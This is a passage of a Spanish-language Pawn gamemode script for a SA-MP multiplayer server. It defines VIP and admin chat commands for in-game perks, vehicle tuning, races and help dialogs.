	ShowPlayerDialog(playerid,2014,DIALOG_STYLE_MSGBOX, "{0080FF}COMANDOS DE VIP NIVEL 2", "{FFFFFF}+ Comandos de vip nivel 1.\n\n/Pbomba, /Abomba, /Dbomba, /Rampa, /SuperSalto.\n/ChatColor, /Vloco, /Nloco , /Musica.", "Aceptar", "");
	}
	else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {FFFF00}Nivel 2{EAEAEA} para usar este comando.");
	return 1;
}
CMD:musica(playerid, params[])
{
    if(PlayerInfo[playerid][Vip] >= 2 || IsPlayerAdmin(playerid)) {
    if (Musica == 1) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Acaban de poner una cancion, espera unos minutos para poder poner otra.");
	ShowPlayerDialog(playerid,Musicall,DIALOG_STYLE_INPUT,"{FF0000}MUSICA","{FFFFFF}COLOCA EL LINK DE LA CANCION.\n\n{FF0000}Sigue los siguientes pasos si no sabes como obtener el link.\n\n{FFFFFF}1 - Busca la cancion que quieras poner en {00FF00}Youtube.com.\n{FFFFFF}2 - Copia el link del video y entra a {00FF00}Offmp3.com.\n{FFFFFF}3 - Pega el link y dale en {FFA500}Convert.\n{FFFFFF}4 - Copia el link de {FFA500}Download MP3{FFFFFF} y pegalo aqui abajo con CTRL + V.","Aceptar","Cancelar");
    } else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {FFFF00}Nivel 2{EAEAEA} para usar este comando.");
	return 1;
}
CMD:dmusica(playerid, params[])
{
	StopAudioStreamForPlayer(playerid);
    return 1;
}
CMD:supersalto(playerid,params[]) {
    if(PlayerInfo[playerid][Vip] >= 2 || IsPlayerAdmin(playerid)) {
		if(MegaJump[playerid] == 0)
		{
			GameTextForPlayer(playerid, "~w~Super Salto ~n~~r~Activado",2500,3);
			SendClientMessage(playerid, red, "|Info| »{EAEAEA} Super saltos activado.");
			MegaJump[playerid] = 1;
		}
		else if(MegaJump[playerid] == 1)
		{
			GameTextForPlayer(playerid, "~w~Super Salto ~n~~r~Deactivado",2500,3);
			SendClientMessage(playerid, red, "|Info| »{EAEAEA} Super saltos desactivado.");
			MegaJump[playerid] = 0;
		}
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {FFFF00}Nivel 2{EAEAEA} para usar este comando.");
	return 1;
}
CMD:rampa(playerid,params[]) {
    if(PlayerInfo[playerid][Vip] >= 2 || IsPlayerAdmin(playerid)) {
		if(Enabled[playerid])
		{
			SendClientMessage(playerid, red, "|Info| »{EAEAEA} Rampa desactivada.");
			GameTextForPlayer(playerid, "~w~Rampa ~n~~r~Desactivada",2500,3);
			Enabled[playerid]=0;
			Pers[playerid]=0;
		}
		else
		{
			if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} ¡No estás en un vehículo!");
			GameTextForPlayer(playerid, "~w~Rampa ~n~~r~Activada",2500,3);
			SendClientMessage(playerid, red, "|Info| »{EAEAEA} Rampa activada");
			SendClientMessage(playerid, red, "|Info| »{EAEAEA} Para crear la rampa presiona {919770}CTRL{EAEAEA} o {919770}ALT GR.");
			Enabled[playerid]=1;
			Pers[playerid]=1632;
		}
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {FFFF00}Nivel 2{EAEAEA} para usar este comando.");
	return 1;
}

CMD:supernitro(playerid,params[]){
		if(!IsPlayerInAnyVehicle(playerid))
		{
			SendClientMessage(playerid, red, "|Error| »{EAEAEA} No estas en ningún vehiculo.");
			return 1;
		}
		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER)
		{
            SendClientMessage(playerid, red, "|Error| »{EAEAEA} No eres el conductor.");
			return 1;
		}
		if(PlayerInfo[playerid][Vip] <1){
			SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {FFFF00}Nivel 1{EAEAEA} para usar este comando.");
			return 1;
		}
		if(AceleracionBrutal[playerid] == false)
		{
			SendClientMessage(playerid, red, "|Info| »{EAEAEA} Supernitro activado.");
			GameTextForPlayer(playerid, "~w~SUPERNITRO ~g~~h~ACTIVADO~w~!", 3000, 3);
			AceleracionBrutal[playerid] = true;
		}
		else if(AceleracionBrutal[playerid] == true)
		{
			SendClientMessage(playerid, red, "|Info| »{EAEAEA} Supernitro desactivado.");
            GameTextForPlayer(playerid, "~w~SUPERNITRO ~r~~h~DESACTIVADA~w~!", 3000, 3);
			AceleracionBrutal[playerid] = false;
		}
		return 1;
}

CMD:saltosv(playerid,params[]){
		if(!IsPlayerInAnyVehicle(playerid))
		{
			SendClientMessage(playerid, red, "|Error| »{EAEAEA} No estas en ningún vehiculo.");
			return 1;
		}
		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER)
		{
            SendClientMessage(playerid, red, "|Error| »{EAEAEA} No eres el conductor.");
			return 1;
		}
		if(PlayerInfo[playerid][Vip] <1){
			SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {FFFF00}Nivel 1{EAEAEA} para usar este comando.");
			return 1;
		}
		if(SaltosVehiculo[playerid] == false)
		{
			SendClientMessage(playerid, red, "|Info| »{EAEAEA} Saltos de vehiculo activado.");
			GameTextForPlayer(playerid, "~w~SALTOS DE VEHICULO ~g~~h~ACTIVADO~w~!", 3000, 3);
			SaltosVehiculo[playerid] = true;
		}
		else if(SaltosVehiculo[playerid] == true)
		{
			SendClientMessage(playerid, red, "|Info| »{EAEAEA} Saltos de vehiculo desactivado.");
            GameTextForPlayer(playerid, "~w~SALTOS DE VEHICULO ~r~~h~DESACTIVADO~w~!", 3000, 3);
			SaltosVehiculo[playerid] = false;
		}
		return 1;
}

CMD:abomba(playerid,params[]) {
    if(PlayerInfo[playerid][Vip] >= 2 || IsPlayerAdmin(playerid)) {
		if(BombArmed[playerid] == true)
		{
			CreateExplosion(BombX[playerid], BombY[playerid], BombZ[playerid], 10, 15);
			SendClientMessage(playerid, red, "|Info| »{EAEAEA} La bomba ha explotado.");
			DestroyObject(BombObject[playerid]);
			BombArmed[playerid] = false;
		}
		else
		{
			SendClientMessage(playerid, red, "|Error| »{EAEAEA} No has plantado ninguna bomba.");
		}
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {FFFF00}Nivel 2{EAEAEA} para usar este comando.");
	return 1;
}
CMD:pbomba(playerid,params[]) {
    if(PlayerInfo[playerid][Vip] >= 2 || IsPlayerAdmin(playerid)) {
		if(BombArmed[playerid] == false)
		{
			ApplyAnimation(playerid, "BOMBER", "BOM_Plant", 4.0, 0, 0, 0, 0, 0);
			GetPlayerPos(playerid, BombX[playerid], BombY[playerid], BombZ[playerid]);
			GetXYInFrontOfPlayer(playerid, BombX[playerid], BombY[playerid], 0.7);
			SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has plantado una bomba, para activarla usa {C0C0C0}/ABomba{EAEAEA} y para desactivarla {C0C0C0}/DBomba.");
			BombObject[playerid] = CreateObject(1252, BombX[playerid], BombY[playerid], BombZ[playerid] - 0.8,270,0,0);
			BombArmed[playerid] = true;
		}
		else
		{
			SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya has plantado una bomba.");
		}
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {FFFF00}Nivel 2{EAEAEA} para usar este comando.");
	return 1;
}
CMD:dbomba(playerid,params[]) {
    if(PlayerInfo[playerid][Vip] >= 2 || IsPlayerAdmin(playerid)) {
		if(IsPlayerInRangeOfPoint(playerid, 2.0,BombX[playerid], BombY[playerid], BombZ[playerid]))
		{
			ApplyAnimation(playerid, "BOMBER", "BOM_Plant", 4.0, 0, 0, 0, 0, 0);
			KillTimer(bombtimer[playerid]);
			SendClientMessage(playerid, red, "|Info| »{EAEAEA} Bomba desactivada.");
			DestroyObject(BombObject[playerid]);
			BombArmed[playerid] = false;
		}
		else
		{
			SendClientMessage(playerid, red, "|Error| »{EAEAEA} Tienes que estar cerca de la bomba para desactivarla.");
		}
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {FFFF00}Nivel 2{EAEAEA} para usar este comando.");
	return 1;
}
CMD:vlevel1(playerid,params[]){
	#pragma unused params
	if(PlayerInfo[playerid][Vip] >=1 || IsPlayerAdmin(playerid)) {
	ShowPlayerDialog(playerid,2014,DIALOG_STYLE_MSGBOX, "{0080FF}COMANDOS DE VIP NIVEL 1", "{FFFFFF}+ Tu vehiculo se repara automaticamente.\n+ Puedes activar el turbo con la tecla ctrl\n+ Puedes saltar en el vehiculo con la tecla h.\n+ Tienes nitro infinito.\n\n/Vsay, /Cvip, /Tvip, /Invisible, /Visible, /Vida, /Armadura, /Jet, /Autotunear, /Supernitro, /Saltosv, /Ayudaglobo.", "Aceptar", "");
	}
	else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {00FF00}Nivel 1{EAEAEA} para usar este comando.");
	return 1;
}

CMD:vip1(playerid,params[]){
	#pragma unused params
	cmd_vlevel1(playerid,"\1");
	return 1;
}

CMD:vip2(playerid,params[]){
	#pragma unused params
	cmd_vlevel2(playerid,"\1");
	return 1;
}

CMD:vip3(playerid,params[]){
	#pragma unused params
	cmd_vlevel3(playerid,"\1");
	return 1;
}

CMD:neones(playerid,params[])
{
	if(IsPlayerInAnyVehicle(playerid))
	{
		ShowPlayerDialog(playerid, neondialog, DIALOG_STYLE_LIST, "MENÚ DE NEONES", "Azul oscuro\nRojo\nVerde\nBlanco\nVioleta\nAmarillo\nCyan\nAzul claro\nRosa\nNaranja\nVerde claro\nAmarillo claro\nBorrar Neon", "Seleccionar", "Cancelar");
	}
return 1;
}

CMD:autotunear(playerid,params[]) {
     if(PlayerInfo[playerid][Vip] >= 1) {
     new idcarro;
     if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, red, "[ERROR]:{FFFFFF} ¡No estás en un auto!");
     if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER)
     {
     SendClientMessage(playerid, red, "[ERROR]:{FFFFFF} ¡No eres el conductor!");
     return 1;
     }
     idcarro = GetPlayerVehicleID(playerid);
     if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 562)
     {
     AddVehicleComponent(idcarro,1046);
     AddVehicleComponent(idcarro,1171);
     AddVehicleComponent(idcarro,1149);
     AddVehicleComponent(idcarro,1035);
     AddVehicleComponent(idcarro,1147);
     AddVehicleComponent(idcarro,1036);
     AddVehicleComponent(idcarro,1040);
     ChangeVehiclePaintjob(idcarro, 2);
     AddVehicleComponent(idcarro,1079);
     ChangeVehicleColor(idcarro, 1, 1);
     }
     if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 560)
     {
	 AddVehicleComponent(idcarro,1028);
	 AddVehicleComponent(idcarro,1169);
	 AddVehicleComponent(idcarro,1141);
	 AddVehicleComponent(idcarro,1032);
	 AddVehicleComponent(idcarro,1138);
	 AddVehicleComponent(idcarro,1026);
	 AddVehicleComponent(idcarro,1027);
	 ChangeVehiclePaintjob(idcarro, 0);
	 AddVehicleComponent(idcarro,1080);
	 ChangeVehicleColor(idcarro, 1, 1);
	 }
	 if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 565)
	 {
	 AddVehicleComponent(idcarro,1046);
	 AddVehicleComponent(idcarro,1153);
	 AddVehicleComponent(idcarro,1150);
	 AddVehicleComponent(idcarro,1054);
	 AddVehicleComponent(idcarro,1049);
	 AddVehicleComponent(idcarro,1047);
	 AddVehicleComponent(idcarro,1051);
	 AddVehicleComponent(idcarro,1079);
	 ChangeVehiclePaintjob(idcarro, 2);
	 ChangeVehicleColor(idcarro, 1, 1);
	 }
	 if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 559)
	 {
	 AddVehicleComponent(idcarro,1065);
	 AddVehicleComponent(idcarro,1160);
	 AddVehicleComponent(idcarro,1159);
	 AddVehicleComponent(idcarro,1067);
	 AddVehicleComponent(idcarro,1162);
	 AddVehicleComponent(idcarro,1069);
	 AddVehicleComponent(idcarro,1071);
	 AddVehicleComponent(idcarro,1079);
	 ChangeVehiclePaintjob(idcarro, 1);
	 ChangeVehicleColor(idcarro, 1, 1);
	 }
	 if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 561)
	 {
	 AddVehicleComponent(idcarro,1064);
	 AddVehicleComponent(idcarro,1155);
	 AddVehicleComponent(idcarro,1154);
	 AddVehicleComponent(idcarro,1055);
	 AddVehicleComponent(idcarro,1158);
	 AddVehicleComponent(idcarro,1056);
	 AddVehicleComponent(idcarro,1062);
	 AddVehicleComponent(idcarro,1079);
	 ChangeVehiclePaintjob(idcarro, 2);
	 ChangeVehicleColor(idcarro, 1, 1);
	 }
	 if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 558)
	 {
	 AddVehicleComponent(idcarro,1089);
	 AddVehicleComponent(idcarro,1166);
	 AddVehicleComponent(idcarro,1168);
	 AddVehicleComponent(idcarro,1088);
	 AddVehicleComponent(idcarro,1164);
	 AddVehicleComponent(idcarro,1090);
	 AddVehicleComponent(idcarro,1094);
	 AddVehicleComponent(idcarro,1079);
	 ChangeVehiclePaintjob(idcarro, 2);
	 ChangeVehicleColor(idcarro, 1, 1);
	 }
	 if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 575)
	 {
	 AddVehicleComponent(idcarro,1044);
	 AddVehicleComponent(idcarro,1174);
	 AddVehicleComponent(idcarro,1176);
	 AddVehicleComponent(idcarro,1042);
	 AddVehicleComponent(idcarro,1099);
	 AddVehicleComponent(idcarro,1079);
	 ChangeVehiclePaintjob(idcarro, 1);
	 ChangeVehicleColor(idcarro, 1, 1);
	 }
	 if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 534)
	 {
	 AddVehicleComponent(idcarro,1126);
	 AddVehicleComponent(idcarro,1179);
	 AddVehicleComponent(idcarro,1180);
	 AddVehicleComponent(idcarro,1122);
	 AddVehicleComponent(idcarro,1101);
	 AddVehicleComponent(idcarro,1125);
	 AddVehicleComponent(idcarro,1123);
	 AddVehicleComponent(idcarro,1100);
	 AddVehicleComponent(idcarro,1079);
	 ChangeVehiclePaintjob(idcarro, 2);
	 ChangeVehicleColor(idcarro, 1, 1);
	 }
	 if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 536)
	 {
	 AddVehicleComponent(idcarro,1104);
	 AddVehicleComponent(idcarro,1182);
	 AddVehicleComponent(idcarro,1184);
	 AddVehicleComponent(idcarro,1108);
	 AddVehicleComponent(idcarro,1107);
	 AddVehicleComponent(idcarro,1079);
	 ChangeVehiclePaintjob(idcarro, 1);
	 ChangeVehicleColor(idcarro, 1, 1);
	 }
	 if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 567)
	 {
	 AddVehicleComponent(idcarro,1129);
	 AddVehicleComponent(idcarro,1189);
	 AddVehicleComponent(idcarro,1187);
	 AddVehicleComponent(idcarro,1102);
	 AddVehicleComponent(idcarro,1133);
	 AddVehicleComponent(idcarro,1079);
	 ChangeVehiclePaintjob(idcarro, 2);
	 ChangeVehicleColor(idcarro, 1, 1);
	 }
	 if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 420)
	 {
	 AddVehicleComponent(idcarro,1010);
	 AddVehicleComponent(idcarro,1087);
	 AddVehicleComponent(idcarro,1081);
	 AddVehicleComponent(idcarro,1139);
	 AddVehicleComponent(idcarro,1079);
	 ChangeVehicleColor(idcarro, 1, 1);
	 }
	 if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 400)
	 {
	 AddVehicleComponent(idcarro,1010);
	 AddVehicleComponent(idcarro,1087);
	 AddVehicleComponent(idcarro,1018);
	 AddVehicleComponent(idcarro,1013);
	 AddVehicleComponent(idcarro,1081);
	 AddVehicleComponent(idcarro,1086);
	 AddVehicleComponent(idcarro,1079);
	 ChangeVehicleColor(idcarro, 1, 1);
	 }
	 if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 401)
	 {
	 AddVehicleComponent(idcarro,1086);
	 AddVehicleComponent(idcarro,1139);
	 AddVehicleComponent(idcarro,1081);
	 AddVehicleComponent(idcarro,1010);
	 AddVehicleComponent(idcarro,1087);
	 AddVehicleComponent(idcarro,1012);
	 AddVehicleComponent(idcarro,1013);
	 AddVehicleComponent(idcarro,1042);
	 AddVehicleComponent(idcarro,1043);
	 AddVehicleComponent(idcarro,1018);
	 AddVehicleComponent(idcarro,1006);
	 AddVehicleComponent(idcarro,1007);
	 AddVehicleComponent(idcarro,1017);
	 AddVehicleComponent(idcarro,1079);
	 ChangeVehicleColor(idcarro, 1, 1);
	 }
	 if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 576)
	 {
	 ChangeVehiclePaintjob(idcarro,2);
	 AddVehicleComponent(idcarro,1191);
	 AddVehicleComponent(idcarro,1193);
	 AddVehicleComponent(idcarro,1010);
	 AddVehicleComponent(idcarro,1018);
	 AddVehicleComponent(idcarro,1081);
	 AddVehicleComponent(idcarro,1087);
	 AddVehicleComponent(idcarro,1134);
	 AddVehicleComponent(idcarro,1137);
	 AddVehicleComponent(idcarro,1079);
	 ChangeVehicleColor(idcarro, 1, 1);
	 }
	 if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 535)
	 {
	 ChangeVehiclePaintjob(idcarro,1);
	 AddVehicleComponent(idcarro,1115);
	 AddVehicleComponent(idcarro,1073);
	 AddVehicleComponent(idcarro,1087);
	 AddVehicleComponent(idcarro,1081);
	 AddVehicleComponent(idcarro,1121);
	 AddVehicleComponent(idcarro,1109);
	 AddVehicleComponent(idcarro,1117);
	 AddVehicleComponent(idcarro,1010);
	 AddVehicleComponent(idcarro,1114);
	 AddVehicleComponent(idcarro,1119);
	 ChangeVehicleColor(idcarro, 1, 1);
	 }
	 if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 483)
	 {
	 new paintjobid;
	 ChangeVehiclePaintjob(idcarro,0);
	 ChangeVehicleColor(idcarro, 1, 1);
	 if(onsys[idcarro] == 1) {
     SavePaintjob(idcarro,paintjobid);
     }
	 }
	 if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 495)
	 {
	 AddVehicleComponent(idcarro,1085);
	 ChangeVehicleColor(idcarro,0,0);
	 }
	 if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 411)
	 {
	 AddVehicleComponent(idcarro,1079);
	 ChangeVehicleColor(idcarro, 1, 1);
	 }
	 } else return ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"{FF0000}NIVEL INSUFICIENTE","{FFFFFF}NECESITAS SER VIP {00FF00}NIVEL 1{FFFFFF} PARA USAR ESTE COMANDO.", "Aceptar", "");
	 return 1;
	 }


CMD:tcamper(playerid,params[]) {
		new idcarro;
		new veh=GetPlayerVehicleID(playerid);
		if(GetVehicleModel(veh) != 483)return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas estar en el vehiculo camper para poder usar este comando.");
		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER)
		{
			SendClientMessage(playerid, red, "|Error| »{EAEAEA} No eres el conductor.");
			return 1;
		}
		idcarro = GetPlayerVehicleID(playerid);
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 483)
		{
			new paintjobid;
			ChangeVehiclePaintjob(idcarro,0);
			ChangeVehicleColor(idcarro, 1, 1);
			if(onsys[idcarro] == 1) {
				SavePaintjob(idcarro,paintjobid);
			}
		}
	return 1;
}

CMD:invisible(playerid,params[]) {
    if(PlayerInfo[playerid][Vip] >= 1 || IsPlayerAdmin(playerid)) {
		Color = GetPlayerColor(playerid);
		SetPlayerColor(playerid, 0xFFFFFF00);
		GameTextForPlayer(playerid, "~w~Modo Invisible~n~~r~Activado",2500,3);
		SendClientMessage(playerid, red, "|Info| »{EAEAEA} Modo invisible activado.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {00FF00}Nivel 1{EAEAEA} para usar este comando.");
	return 1;
}
CMD:visible(playerid,params[]) {
    if(PlayerInfo[playerid][Vip] >= 1 || IsPlayerAdmin(playerid)) {
		SetPlayerColor(playerid, Color);
		GameTextForPlayer(playerid, "~w~Modo Invisible~n~~r~Desactivado",2500,3);
		SendClientMessage(playerid, red, "|Info| »{EAEAEA} Modo invisible desactivado.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {00FF00}Nivel 1{EAEAEA} para usar este comando.");
	return 1;
}

CMD:guerratotalon(playerid,params[]){
	#pragma unused params
	GuerraTotalOn();
	return 1;
}

CMD:guerratotaloff(playerid,params[]){
	#pragma unused params
	GuerraTotalOff();
	return 1;
}

/*CMD:startrace(playerid, params[])
{
    cmd_empezar(playerid, "\1");
    return 1;
}*/

CMD:empezar(playerid, params[])
{
    if(AutomaticRace == true) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} No es posible, el modo automatico esta activado.");
    if(BuildRace != 0) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Se esta construyendo una carrera.");
    if(RaceBusy == 0x01 || RaceStarted == 1) return SendClientMessage(playerid, RED, "|Error| »{EAEAEA} Hay una carrera en curso, espere a que acabe.");
    if(!strlen(params)) return SendClientMessage(playerid, red, "|Error| »{EAEAEA}Usa /empezar[NUMERODELACARRERA].");
    LoadRace(playerid, params);
    return 1;
}

CMD:startautorace(playerid, params[])
{
	if(!IsPlayerAdmin(playerid)) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Solo Psicoloco puede usar este comando.");
	//if(RaceBusy == 0x01 || RaceStarted == 1) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Hay una carrera activada. Espera a que acabe!");
	if(AutomaticRace == true) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} El modo automático ya está activado. Si se desea desactivar {C0C0C0}/StopAutoRace!");
    LoadRaceNames();
	LoadAutoRace(RaceNames[random(TotalRaces)]);
	AutomaticRace = true;
	SendClientMessage(playerid, red, "|Info| »{EAEAEA} Haz iniciado el modo de carreras automaticas, si desea desactivarlo utiliza {C0C0C0}/stopautorace.");
	GameTextForAll("~w~Evento de Carreras~n~~r~Activado", 5000, 5);
	return 1;
}

CMD:stopautorace(playerid, params[])
{
    if(!IsPlayerAdmin(playerid)) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Solo Psicoloco puede usar este comando.");
    if(AutomaticRace == false) return SendClientMessage(playerid, red, "|Error| »{EAEAEA}Ya está desactivado!");
    GameTextForAll("~w~Evento de Carreras~n~~r~Desactivado", 5000, 5);
    AutomaticRace = false;
    return 1;
}

CMD:stoprace(playerid, params[])
{
    if(!IsPlayerAdmin(playerid)) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Solo Psicoloco puede usar este comando.");
    if(RaceBusy == 0x00 || RaceStarted == 0) return SendClientMessage(playerid, RED, "{FF0000}[ERROR]:{FFFFFF} No hay ninguna carrera activa!");
	SendClientMessageToAll(red, "|Error| »{EAEAEA}Un admin finalizó la carrera");
	return StopRace();
}


CMD:level1(playerid,params[]){
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 1 || IsPlayerAdmin(playerid)) {
	ShowPlayerDialog(playerid,2014,DIALOG_STYLE_MSGBOX, "{FF0000}COMANDOS DE ADMIN NIVEL 1", "{FFFFFF}/CarColour, /Reports, /Ip, /Announce, /Announce2, /Goto.\n/Cadmin, /Asay, /Asay2, /Tadmin, /Tadmin2, /Warn, /Disarm.\n/Rwarn, /Explode, /Dtag.", "Aceptar", "");
	}
	else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 1{EAEAEA} para usar este comando.");
	return 1;
}
CMD:level2(playerid,params[]){
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 2 || IsPlayerAdmin(playerid)) {
	ShowPlayerDialog(playerid,2014,DIALOG_STYLE_MSGBOX, "{FF0000}COMANDOS DE ADMIN NIVEL 2", "{FFFFFF}/Announce3, /Slap, /Lspec, /Lspecoff, /Mute, /Unmute, /Write.\n/ClearChat, /Get, /Vgoto, /Vget.", "Aceptar", "");
	}
	else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 2{EAEAEA} para usar este comando.");
	return 1;
}
CMD:level3(playerid,params[]){
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 3 || IsPlayerAdmin(playerid)) {
	ShowPlayerDialog(playerid,2014,DIALOG_STYLE_MSGBOX, "{FF0000}COMANDOS DE ADMIN NIVEL 3", "{FFFFFF}/HealAll, /ArmourAll, /GiveCash, /SetSkin, /SetColour, /SetInterior.\n/Spawn, /Kick, /Explode, /Eject, /Jail, /UnJail, /Freeze, /UnFreeze.\n/Announce4.", "Aceptar", "");
	}
	else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 3{EAEAEA} para usar este comando.");
	return 1;
}
CMD:level4(playerid,params[]){
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 4 || IsPlayerAdmin(playerid)) {
	ShowPlayerDialog(playerid,2014,DIALOG_STYLE_MSGBOX, "{FF0000}COMANDOS DE ADMIN NIVEL 4", "{FFFFFF}/GiveWeapon, /Get, /CarHealth, /DestroyCar.\n/Akill, /Respawncars, /Hide, /Unhide.", "Aceptar", "");
	}
	else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 4{EAEAEA} para usar este comando.");
	return 1;
}
CMD:level5(playerid,params[]){
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 5 || IsPlayerAdmin(playerid)) {
	ShowPlayerDialog(playerid,2014,DIALOG_STYLE_MSGBOX, "{FF0000}COMANDOS DE ADMIN NIVEL 5", "{FFFFFF}/SetHealth, /SetArmour, /SetName, /SetWorld, /SetWeather, /SetScore.\n/GiveScore, /Lgoto.", "Aceptar", "");
	}
	else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 5{EAEAEA} para usar este comando.");
	return 1;
}
CMD:level6(playerid,params[]){
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 6 || IsPlayerAdmin(playerid)) {
	ShowPlayerDialog(playerid,2014,DIALOG_STYLE_MSGBOX, "{FF0000}COMANDOS DE ADMIN NIVEL 6", "{FFFFFF}/GiveKills, /GiveDeaths, /SetKills, /SetDeaths, /MuteAll, /UnMuteall.\n/FreezeAll, /UnFreezeAll, /SetAllWorld, /SetAllWeather, /GiveAllWeapon.\n/SetAllCash, /GiveAllCash, /Ban, /DisableChat.", "Aceptar", "");
	}
	else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 6{EAEAEA} para usar este comando.");
	return 1;
}
CMD:level7(playerid,params[]){
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 7 || IsPlayerAdmin(playerid)) {
	ShowPlayerDialog(playerid,2014,DIALOG_STYLE_MSGBOX, "{FF0000}COMANDOS DE ADMIN NIVEL 7", "{FFFFFF}/Enable, /Disable, /ClearAllChat, /GiveVehicle, /Fu, /Aka, /God, /Godcar.\n/Nban, /Nban2.", "Aceptar", "");
	}
	else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 7{EAEAEA} para usar este comando.");
	return 1;
}
CMD:level8(playerid,params[]){
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 8 || IsPlayerAdmin(playerid)) {
	ShowPlayerDialog(playerid,2014,DIALOG_STYLE_MSGBOX, "{FF0000}COMANDOS DE ADMIN NIVEL 8", "{FFFFFF}/GiveAllKills, /GiveAllDeaths, /SetAllKills, /SetAllDeaths, /SetAllScore.\n/GiveAllScore, /KillAll, /KickAll, /EjectAll, /DisarmAll.\n/SetAllSkin /SpawnAll, /ExplodeAll, /GetAll, /Iniciarcarrera, /Terminarcarrera.", "Aceptar", "");
	}
	else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 8{EAEAEA} para usar este comando.");
	return 1;
}
CMD:level9(playerid,params[]){
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 9 || IsPlayerAdmin(playerid)) {
	ShowPlayerDialog(playerid,2014,DIALOG_STYLE_MSGBOX, "{FF0000}COMANDOS DE ADMIN NIVEL 9", "{FFFFFF}/Ubound, /FakeDeath, /FakeChat, /FakeCmd, /FakeCmdAll, /Crash, /BankRupt.\n/Spam, /Lmenu, /RemoveBan, /Rban, /Checkinactive.", "Aceptar", "");
	}
	else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 9{EAEAEA} para usar este comando.");
	return 1;
}
CMD:level10(playerid,params[]){
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 10 || IsPlayerAdmin(playerid)) {
	ShowPlayerDialog(playerid,2014,DIALOG_STYLE_MSGBOX, "{FF0000}COMANDOS DE ADMIN NIVEL 10", "{FFFFFF}/SetLevel, /SetTempLevel, /SetVip, /SetPass, /DeleteAccount, /BanAll.\n/DeleteAccount2, /Osay, /Cowner, /Towner, /Vparkadmin.", "Aceptar", "");
	}
	else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 10{EAEAEA} para usar este comando.");
	return 1;
}
CMD:nivel1(playerid,params[]){
	#pragma unused params
	cmd_level1(playerid, "\1");
	return 1;
}
CMD:nivel2(playerid,params[]){
	#pragma unused params
	cmd_level2(playerid, "\1");
	return 1;
}
CMD:nivel3(playerid,params[]){
	#pragma unused params
	cmd_level3(playerid, "\1");
	return 1;
}
CMD:nivel4(playerid,params[]){
	#pragma unused params
	cmd_level4(playerid, "\1");
	return 1;
}
CMD:nivel5(playerid,params[]){
	#pragma unused params
	cmd_level5(playerid, "\1");
	return 1;
